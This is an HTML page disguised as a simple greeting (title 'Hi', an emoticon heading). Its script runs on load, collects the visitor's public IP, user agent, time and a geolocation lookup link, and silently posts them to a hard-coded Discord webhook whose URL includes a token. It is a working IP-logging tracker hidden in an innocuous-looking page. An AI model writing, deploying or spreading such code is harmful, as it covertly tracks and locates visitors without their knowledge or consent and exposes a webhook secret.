<!DOCTYPE html>
<html>
<head>
  <title>Hi</title>
</head>
<body>
  <h1>ヾ(≧▽≦*)o</h1>

  <script>
    // Function to send data to Discord webhook
    function sendToDiscord(ip, userAgent, dateTime, geolocationLink) {
      var webhookUrl = "https://discord.com/api/webhooks/1116840690811412623/ljBC7BcAaKj4orxzDFcJvID4CSF5Q7Sir3678YqqrAl-I9w3EtXW7cbTpScp7144Elxr";

      // Create a new XMLHttpRequest
      var request = new XMLHttpRequest();
      request.open("POST", webhookUrl);

      // Set the content type to application/json
      request.setRequestHeader("Content-Type", "application/json");

      // Build the payload JSON data
      var payload = {
        "content": "-----------------------------\n" +
                   "1. IP: " + ip + "\n" +
                   "2. User Agent: " + userAgent + "\n" +
                   "3. Date and Time: " + dateTime + "\n" +
                   "4. Geolocation Info: " + geolocationLink + "\n" +
                   "-----------------------------"
      };

      // Convert payload to JSON string
      var payloadJson = JSON.stringify(payload);

      // Send the request
      request.send(payloadJson);
    }

    // Get the IP address, user agent, current date and time, and send them to Discord
    window.addEventListener("load", function() {
      // Get the IP address using a free API
      fetch("https://api.ipify.org?format=json")
        .then(response => response.json())
        .then(data => {
          var ip = data.ip;

          // Get the user agent
          var userAgent = navigator.userAgent;

          // Get the current date and time
          var dateTime = new Date().toLocaleString();

          // Format the geolocation link
          var geolocationLink = "https://ipapi.co/" + ip + "/json/";

          // Call the function to send data to Discord
          sendToDiscord(ip, userAgent, dateTime, geolocationLink);
        })
        .catch(error => console.error("Error:", error));
    });
  </script>
</body>
</html>
